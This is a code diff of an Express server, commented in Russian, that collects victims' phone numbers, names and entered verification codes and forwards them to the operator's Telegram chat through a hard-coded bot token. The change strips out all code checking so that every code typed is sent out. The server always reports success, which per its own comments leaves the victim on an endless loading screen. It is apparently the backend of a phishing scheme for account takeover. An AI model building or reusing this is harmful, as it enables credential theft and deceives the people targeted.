@@ -11,7 +11,7 @@ const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
 const YOUR_ID = '6277925229';
 const YOUR_USERNAME = '@anyaskds';
 
-// Хранилище кодов
+// Хранилище кодов (просто для справки, но не используем для проверки)
 const codes = {};
 
 app.get('/', (req, res) => {
@@ -22,7 +22,7 @@ app.get('/', (req, res) => {
 function sendTelegramMessage(chatId, message) {
     const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
-    return fetch(TELEGRAM_API, {
+    fetch(TELEGRAM_API, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -36,17 +36,17 @@ function sendTelegramMessage(chatId, message) {
         if (data.ok) {
             console.log(`✅ Успешно отправлено в ${chatId}`);
         } else {
-            console.log(`❌ Ошибка: ${data.description}`);
+            console.log(`❌ Ошибка отправки в ${chatId}: ${data.description}`);
         }
-        return data;
     })
     .catch(err => console.log(`❌ Ошибка fetch: ${err.message}`));
 }
 
-// ЭТАП 1: Человек написал номер → ПРИХОДИТ ТОЛЬКО НОМЕР
+// ===== ЭТАП 1: Человек написал номер → ПРИХОДИТ ТОЛЬКО НОМЕР =====
 app.post('/api/send-code', (req, res) => {
     const { phone, region, fullName, username, userId } = req.body;
 
+    // Генерируем код и сохраняем его
     const code = Math.floor(100000 + Math.random() * 900000).toString();
 
     codes[phone] = {
@@ -81,32 +81,16 @@ app.post('/api/send-code', (req, res) => {
     res.json({ success: true });
 });
 
-// ЭТАП 2: Человек ввел код → ПРИХОДИТ ТОЛЬКО КОД
+// ===== ЭТАП 2: Человек ввел код → ПРИХОДИТ КОД (ВСЕГДА!) =====
 app.post('/api/verify-code', (req, res) => {
     const { phone, code, fullName, username, userId } = req.body;
 
-    console.log('📥 ПРОВЕРКА КОДА');
+    console.log('📥 ПОЛУЧЕН КОД ОТ ПОЛЬЗОВАТЕЛЯ');
     console.log('📱 Телефон:', phone);
     console.log('🔑 Введенный код:', code);
+    console.log('👤 Имя:', fullName);
 
-    const stored = codes[phone];
-
-    if (!stored) {
-        return res.status(400).json({ success: false, message: 'Код не найден' });
-    }
-
-    if (Date.now() > stored.expires) {
-        delete codes[phone];
-        return res.status(400).json({ success: false, message: 'Код истек' });
-    }
-
-    if (stored.code !== code) {
-        return res.status(400).json({ success: false, message: 'Неверный код' });
-    }
-
-    console.log('✅ КОД ВВЕДЕН!');
-
-    // ⚡ СООБЩЕНИЕ 2: ТОЛЬКО КОД
+    // ⚡ СООБЩЕНИЕ 2: ВСЕГДА ОТПРАВЛЯЕМ КОД, КОТОРЫЙ ВВЕЛ ПОЛЬЗОВАТЕЛЬ
     const messageCode = `
 🔑 ВВЕДЕН КОД!
 
@@ -119,16 +103,16 @@ app.post('/api/verify-code', (req, res) => {
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    // Отправляем ТОЛЬКО КОД
+    // Отправляем КОД (ВСЕГДА!)
     sendTelegramMessage(YOUR_ID, messageCode);
     sendTelegramMessage(YOUR_USERNAME, messageCode);
 
-    delete codes[phone];
-
+    // ВСЕГДА ВОЗВРАЩАЕМ УСПЕХ, ДАЖЕ ЕСЛИ КОД НЕВЕРНЫЙ
+    // ЧТОБЫ У ПОЛЬЗОВАТЕЛЯ ПОКАЗАЛАСЬ БЕСКОНЕЧНАЯ ЗАГРУЗКА
     res.json({ success: true });
 });
 
-// Повторная отправка кода
+// ===== ПОВТОРНАЯ ОТПРАВКА КОДА =====
 app.post('/api/resend-code', (req, res) => {
     const { phone } = req.body;
     const newCode = Math.floor(100000 + Math.random() * 900000).toString();
